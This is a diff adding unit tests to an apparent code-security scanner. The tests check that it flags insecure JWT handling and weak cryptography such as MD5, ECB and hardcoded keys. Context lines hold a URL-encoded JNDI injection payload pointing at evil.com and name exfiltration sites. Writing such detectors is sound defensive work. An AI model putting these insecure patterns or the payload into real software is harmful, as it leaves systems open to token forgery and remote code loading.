@@ -575,6 +575,60 @@ test('detects URL-encoded JNDI payload', () => {
   expect(scan('%24%7Bjndi:ldap://evil.com%7D').findings).toIncludeRule('LOG_INJECTION');
 });
 
+// ── JWT Vulnerabilities (JWT_VULN) ────────────────────────────────────────
+test('detects JWT alg:none bypass', () => {
+  expect(scan('const header = { alg: "none", typ: "JWT" }').findings).toIncludeRule('JWT_VULN');
+});
+
+test('detects jwt.decode without verify', () => {
+  expect(scan('const payload = jwt.decode(token)').findings).toIncludeRule('JWT_VULN');
+});
+
+test('detects jwt.decode with verify=false', () => {
+  expect(scan('jwt.decode(token, verify=False)').findings).toIncludeRule('JWT_VULN');
+});
+
+test('detects short JWT secret', () => {
+  expect(scan('const JWT_SECRET = "mysecret"').findings).toIncludeRule('JWT_VULN');
+});
+
+test('detects ignoreExpiration=true', () => {
+  expect(scan('jwt.verify(token, key, { ignoreExpiration: true })').findings).toIncludeRule('JWT_VULN');
+});
+
+test('detects hardcoded JWT token', () => {
+  expect(scan('const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123"').findings).toIncludeRule('JWT_VULN');
+});
+
+// ── Insecure Cryptography (INSECURE_CRYPTO) ──────────────────────────────
+test('detects MD5 usage in Node.js', () => {
+  expect(scan('const hash = crypto.createHash("md5").update(password).digest("hex")').findings).toIncludeRule('INSECURE_CRYPTO');
+});
+
+test('detects MD5 usage in Python', () => {
+  expect(scan('import hashlib; h = hashlib.md5(password.encode())').findings).toIncludeRule('INSECURE_CRYPTO');
+});
+
+test('detects SHA1 usage', () => {
+  expect(scan('crypto.createHash("sha1").update(data)').findings).toIncludeRule('INSECURE_CRYPTO');
+});
+
+test('detects Math.random() for token generation', () => {
+  expect(scan('const token = Math.random().toString(36)').findings).toIncludeRule('INSECURE_CRYPTO');
+});
+
+test('detects ECB cipher mode', () => {
+  expect(scan('crypto.createCipher("aes-256-ecb", key)').findings).toIncludeRule('INSECURE_CRYPTO');
+});
+
+test('detects DES cipher usage', () => {
+  expect(scan('const cipher = DES = require("des")').findings).toIncludeRule('INSECURE_CRYPTO');
+});
+
+test('detects hardcoded encryption key', () => {
+  expect(scan('crypto.createCipheriv("aes-256-cbc", "0123456789abcdef0123456789abcdef")').findings).toIncludeRule('INSECURE_CRYPTO');
+});
+
 test('deduplicates findings by ruleId + line', () => {
   // Same pattern matching twice on same line should deduplicate
   const r = scan('webhook.site requestbin.com');
